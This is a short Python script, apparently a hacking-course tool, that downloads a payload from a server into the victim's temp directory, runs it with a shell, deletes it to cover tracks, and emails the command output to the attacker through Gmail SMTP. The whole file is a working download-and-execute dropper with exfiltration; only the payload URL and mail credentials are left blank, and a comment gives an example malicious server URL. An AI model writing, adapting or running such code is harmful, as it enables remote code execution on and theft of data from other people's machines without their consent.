#!/usr/bin/env python

import requests, smtplib, subprocess, os, tempfile

def download(url):
	response = requests.get(url)
	file_name = "."+url.split("/")[-1]
	with open(file_name, "wb") as f:
		f.write(response.content)

	return file_name

def send_mail(email, password, message):
	smtp_server = smtplib.SMTP("smtp.gmail.com", 587)
	smtp_server.starttls()
	smtp_server.login(email, password)
	smtp_server.sendmail(email,email,message)
	smtp_server.quit()

if __name__ == "__main__":


	# Add the URL to the payload file on a server
	# Example: malicious_file_url = "http://malicious_server/malicious_files/malicious.exe"
	malicious_file_url = ""

	# Downloading and executing the payload on the victim machine
	temp_dir = tempfile.gettempdir()
	os.chdir(temp_dir)
	file_name = download(malicious_file_url)
	result = subprocess.check_output(file_name,shell=True)
	os.remove(file_name) # Remove the payload from machine after Use


	username = "" # Add the Username for the Email Profile from which to send the mail
	password = "" # Add the Password for the Email Profile from which to send the mail
	send_mail(username, password, result)
